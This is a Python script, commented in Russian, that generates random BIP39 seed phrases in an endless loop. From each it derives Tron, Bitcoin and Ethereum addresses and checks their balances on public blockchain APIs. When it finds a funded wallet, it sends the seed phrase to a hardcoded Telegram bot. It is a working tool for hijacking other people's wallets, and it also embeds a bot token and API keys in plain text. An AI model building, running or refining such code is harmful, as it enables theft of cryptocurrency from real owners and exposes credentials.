try:
    import asyncio
    import aiohttp
    from mnemonic import Mnemonic
    from tronpy.keys import PrivateKey
    import bip32utils
    import hashlib
    import bech32
    import requests
    from eth_account import Account
    import binascii
    from tabulate import tabulate
    import os
    import telebot
except:
    print('error import')

s = 0

bot = telebot.TeleBot('7182061752:AAGaWlf6V10jY1lpEmgu8vVd_Gr_wyB0N-Y')
bot.send_message(chat_id='5444874863', text='start')

option = 1
choise = input('Optimization Y/n: ')
if choise == 'Y':
    option = 0
else:
    pass
# Функция генерации адреса TRC20
def generate_tron_address(seed_phrase):
    mnemo = Mnemonic("english")
    seed = mnemo.to_seed(seed_phrase, passphrase="")

    # Создание BIP32 корневого ключа
    bip32_root_key = bip32utils.BIP32Key.fromEntropy(seed)

    # Получение первого дочернего ключа (например, m/44'/195'/0'/0/0)
    bip32_child_key = bip32_root_key.ChildKey(44 + bip32utils.BIP32_HARDEN).ChildKey(
        195 + bip32utils.BIP32_HARDEN).ChildKey(0 + bip32utils.BIP32_HARDEN).ChildKey(0).ChildKey(0)

    # Приватный ключ Tron
    private_key_bytes = bip32_child_key.PrivateKey()

    # Создание приватного ключа Tron
    tron_private_key = PrivateKey(private_key_bytes)

    # Получение TRC20 адреса
    tron_address = tron_private_key.public_key.to_base58check_address()

    return tron_address


# Функция генерации Bech32 адреса
def generate_bech32_address(seed):
    bip32_root_key = bip32utils.BIP32Key.fromEntropy(seed)
    bip32_child_key = bip32_root_key.ChildKey(
        84 + bip32utils.BIP32_HARDEN
    ).ChildKey(
        0 + bip32utils.BIP32_HARDEN
    ).ChildKey(
        0 + bip32utils.BIP32_HARDEN
    ).ChildKey(
        0
    ).ChildKey(
        0
    )
    public_key = bip32_child_key.PublicKey()
    sha256 = hashlib.sha256(public_key).digest()
    ripemd160 = hashlib.new("ripemd160", sha256).digest()
    bech32_address = bech32.encode("bc", 0, ripemd160)
    return bech32_address


# Функция получения BTC баланса
def get_btc_balance(address):
    url = f"https://blockstream.info/api/address/{address}"
    try:
        response = requests.get(url)
        response.raise_for_status()  # Проверка на ошибки HTTP
        data = response.json()
        balance_satoshis = data['chain_stats']['funded_txo_sum'] - data['chain_stats']['spent_txo_sum']
        return balance_satoshis / 1e8
    except Exception as e:
        return 0


# Асинхронная функция для получения баланса TRC20
async def fetch_tron_balance(session, address, api_key):
    url = f"https://api.tronscan.org/api/account?address={address}"
    headers = {'Authorization': f'Bearer {api_key}'}

    try:
        async with session.get(url, headers=headers) as response:
            response.raise_for_status()  # Проверка на ошибки HTTP
            data = await response.json()
            for token in data.get('tokenBalances', []):
                if float(token['amount']) > 0:
                    return float(token['amount'])
            return 0
    except Exception as e:
        return 0


# Асинхронная функция для получения баланса ETH
async def fetch_eth_balance(session, address, api_key):
    url = f"https://api.etherscan.io/api?module=account&action=balance&address={address}&tag=latest&apikey={api_key}"
    try:
        async with session.get(url) as response:
            response.raise_for_status()  # Проверка на ошибки HTTP
            data = await response.json()
            balance_wei = int(data['result'])
            return balance_wei / 1e18
    except Exception as e:
        return 0


# Основная асинхронная функция
async def main():
    global s
    global option
    global bot
    mnemo = Mnemonic("english")
    tron_api_key = "46a0cb18-d42a-45a3-8741-4e205e4ded41"
    etherscan_api_key = "SD8YJFBVPJJTQMUMBC7E4THCNJZ9MPQS6H"
    run = True

    async with aiohttp.ClientSession() as session:
        while run:
            # Генерация случайной seed-фразы
            phrase = mnemo.generate(strength=128)
            seed = mnemo.to_seed(phrase)

            # Генерация адресов
            tron_address = generate_tron_address(phrase)
            btc_address = generate_bech32_address(seed)

            # Получение приватного ключа Ethereum из BIP-32
            bip32_root_key = bip32utils.BIP32Key.fromEntropy(seed)
            bip32_child_key = bip32_root_key.ChildKey(
                44 + bip32utils.BIP32_HARDEN
            ).ChildKey(
                60 + bip32utils.BIP32_HARDEN
            ).ChildKey(
                0 + bip32utils.BIP32_HARDEN
            ).ChildKey(
                0
            ).ChildKey(
                0
            )
            private_key_bytes = bip32_child_key.PrivateKey()
            private_key = binascii.hexlify(private_key_bytes).decode()

            # Создаем Ethereum-адрес из приватного ключа
            account = Account.from_key(private_key)
            eth_address = account.address

            # Получение балансов асинхронно
            tasks = [
                fetch_tron_balance(session, tron_address, tron_api_key),
                fetch_eth_balance(session, eth_address, etherscan_api_key),
                asyncio.to_thread(get_btc_balance, btc_address)
            ]

            tron_balance, eth_balance, btc_balance = await asyncio.gather(*tasks)
            if option == 0:
                os.system('cls')
            # Создаем таблицу для вывода
            table = [
                ["Seed Phrase", phrase],
                ["TRC20 Address", tron_address],
                ["TRC20 Balance (USDT)", f"{tron_balance:.6f}"],
                ["BTC Address", btc_address],
                ["BTC Balance (BTC)", f"{btc_balance:.8f}"],
                ["ETH Address", eth_address],
                ["ETH Balance (ETH)", f"{eth_balance:.6f}"]
            ]

            # Вывод результатов в виде таблицы
            s = s + 1
            print('\n')
            print(tabulate(table, headers=["number", f'{str(s)}'], tablefmt="grid"))
            # Проверка баланса и завершение работы
            if tron_balance > 0 or eth_balance > 0 or btc_balance > 0:
                bot.send_message(chat_id='5444874863', text=table)
                print("Баланс найден!")
                run = False
            else:
                await asyncio.sleep(0.1)


# Запуск асинхронной функции
if __name__ == "__main__":
    asyncio.run(main())



